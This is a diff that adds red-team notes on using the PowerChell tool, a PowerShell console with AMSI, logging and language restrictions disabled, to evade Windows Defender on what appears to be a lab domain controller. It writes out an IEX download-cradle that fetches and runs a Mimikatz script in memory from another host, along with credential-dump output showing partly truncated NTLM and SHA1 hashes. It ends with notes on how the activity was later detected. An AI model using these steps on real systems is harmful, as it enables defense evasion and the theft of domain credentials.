@@ -1,0 +1,147 @@
+================================================================================================================================
+Antivirus bypass using the tool 'PowerChell'
+================================================================================================================================
+
+Github URL => https://github.com/scrt/PowerChell
+
+The tool 'PowerChell' (exe and DLL) is a PowerShell console in C/C++ with all the security features patched or disabled: 
+- Antimalware Scan Interface (AMSI), 
+- Script Block logging, 
+- Module logging, 
+- Transcription, 
+- Execution Policy, 
+- Constrained Language Mode (CLM).
+
+
+================================================================================================================================
+Basic PoC - Test 'PowerChell' on a Windows server 2022 by downloading and executing in-memory the hacking tool Mimikatz 
+            without being blocked by the Windows Defender AV
+================================================================================================================================
+
+--------------------------------------------------------------------------------------------------------
+Step 1 - Compile with Visual Studio the EXE and DLL version of PowerChell
+--------------------------------------------------------------------------------------------------------
+
+Build started at 2:01 AM...
+1>------ Build started: Project: PowerChellLib, Configuration: Release-EXE x64 ------
+2>------ Build started: Project: PowerChell, Configuration: Release-EXE x64 ------
+========== Build: 2 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+========== Build completed at 2:01 AM and took 03.790 seconds ==========
+
+
+Build started at 2:02 AM...
+1>------ Build started: Project: PowerChellLib, Configuration: Release-DLL x64 ------
+2>------ Build started: Project: PowerChell, Configuration: Release-DLL x64 ------
+========== Build: 2 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+========== Build completed at 2:02 AM and took 04.279 seconds ==========
+
+
+--------------------------------------------------------------------------------------------------------
+Step 2 - Download and execute 'PowerChell.exe' on a Windows server 2022 without being detected 
+         nor blocked by the Windows Defender AV 
+--------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator> systeminfo
+
+Host Name:                 WinServer03
+OS Name:                   Microsoft Windows Server 2022 Standard
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00454-20165-74663-AA889
+Original Install Date:     7/26/2025, 2:34:54 AM
+System Boot Time:          12/28/2025, 1:38:09 AM
+<SNIP>
+
+
+C:\Users\Administrator\Downloads> PowerChell.exe
+Windows PowerChell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\Downloads>
+
+PS C:\Users\Administrator\Downloads> hostname
+WinServer03
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 12/19/2025 8:40:49 AM
+
+PS C:\Users\Administrator\Downloads> 
+
+
+--------------------------------------------------------------------------------------------------------
+Step 2 - Use 'PowerChell.exe' to download and execute in-memory Mimikatz on the Windows server 2022 
+         without being blocked by the Windows Defender AV 
+--------------------------------------------------------------------------------------------------------
+
+
+PS C:\Users\Administrator\Downloads> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/Undetected/Invoke-Mimi.ps1');
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 740958 (00000000:000b4e5e)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : TRAINING
+Logon Server      : WinServer03
+Logon Time        : 12/28/2025 1:40:33 AM
+SID               : S-1-5-21-3600403915-1120367806-639521176-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : TRAINING
+         * NTLM     : e45cf19d7c13866f9f67e9d<SNIP>
+         * SHA1     : 456b46a6d65174d4ec4b60e<SNIP>
+         * DPAPI    : 91ee4612a8feb4667ac8e27<SNIP>
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : TRAINING
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : TRAINING.CORP
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+<SNIP>
+
+mimikatz(powershell) # exit
+Bye!
+
+PS C:\Users\Administrator\Downloads>
+
+C:\Users\Administrator\Downloads>
+
+
+---------------------------
+OpSec - Important notes
+---------------------------
+The binary (PowerChell.exe) was not flagged as malicious by Windows Defender during download (including signature‑based and heuristic scans).
+It also successfully bypassed AMSI, allowing in‑memory execution of Mimikatz. 
+However, as expected, the tool was flagged based on its behavior when dumping the LSASS process with Mimikatz, and Windows Defender quarantined the binary due to this suspicious activity.
+
+Threat quarantined - Severe
+Detected: Behavior:Win32/Mikatz.A!sms
+Status: Quarantined 
+
+Threat blocked - Severe
+Detected: Behavior:Win32/Mikatz.A!sms
+Status: Removed
